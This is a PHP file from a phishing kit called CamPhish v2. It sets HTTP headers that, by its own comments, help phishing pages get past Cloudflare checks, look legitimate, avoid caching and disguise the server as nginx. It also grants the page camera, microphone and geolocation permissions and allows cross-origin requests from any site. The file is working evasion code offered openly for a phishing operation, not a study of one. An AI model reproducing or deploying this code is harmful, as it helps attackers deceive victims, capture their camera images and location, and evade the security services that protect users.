<?php
// CamPhish v2 — CloudFlare Bypass Headers
// Add headers that help avoid CloudFlare checks and look legitimate

// Set headers to appear as a normal web server
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer-when-downgrade');
header('Permissions-Policy: camera=self, microphone=self, geolocation=self');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('Content-Security-Policy: upgrade-insecure-requests');

// Cache control — prevent caching of phishing pages
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

// Server masking — hide PHP, look like nginx
header('Server: nginx');
header_remove('X-Powered-By');

// CORS headers — allow cross-origin requests for resources
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}
?>
